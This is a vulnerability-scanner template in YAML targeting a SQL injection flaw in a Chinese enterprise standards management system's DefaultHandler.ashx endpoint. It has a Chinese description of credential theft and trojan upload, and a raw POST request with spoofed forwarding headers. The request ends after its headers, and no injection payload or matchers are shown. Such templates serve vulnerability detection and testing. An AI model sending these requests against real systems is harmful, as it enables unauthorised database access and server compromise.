id: runshen-DefaultHandler-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 润申信息科技企业标准化管理系统 CommentStandardHandler.ashx、DefaultHandler.ashx接口处存在SQL注入漏洞。攻击者可利用漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - http://kpanda.wiki/#/Vulnhub/R14-2%E6%B6%A6%E7%94%B3%E4%BF%A1%E6%81%AF-%E4%BC%81%E4%B8%9A%E6%A0%87%E5%87%86%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-SQL?id=r14-2%e6%b6%a6%e7%94%b3%e4%bf%a1%e6%81%af-%e4%bc%81%e4%b8%9a%e6%a0%87%e5%87%86%e5%8c%96%e7%ae%a1%e7%90%86%e7%b3%bb%e7%bb%9f-sql
  tags: tags
http:
  - raw:
      - |-
        POST /ashx/DefaultHandler.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 687
        Accept: */*
        X-Requested-With: XMLHttpRequest
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.61 Chrome/126.0.6478.61 Not/A)Brand/8  Safari/537.36
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Origin: http://{{Hostname}}
        Referer: http://{{Hostname}}/login.html
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        x-real-ip: 127.0.0.1
        x-forwarded-for: 127.0.0.1
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
        sec-ch-ua-mobile: ?0
